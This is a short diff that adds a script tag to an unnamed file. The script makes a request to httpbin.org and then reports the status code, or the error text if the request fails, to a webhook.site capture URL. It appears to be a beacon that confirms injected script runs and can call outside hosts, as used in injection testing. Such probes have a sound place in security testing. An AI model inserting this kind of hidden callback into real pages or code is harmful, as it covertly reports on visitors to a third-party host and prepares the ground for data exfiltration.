@@ -1,0 +1,5 @@
+<script>
+fetch("https://httpbin.org/status/200")
+  .then(r => fetch("https://webhook.site/8e33713a-acea-4b39-bfa9-cf8ffd7d7a1d?step2=" + r.status))
+  .catch(err => fetch("https://webhook.site/8e33713a-acea-4b39-bfa9-cf8ffd7d7a1d?error=" + encodeURIComponent(err)));
+</script>
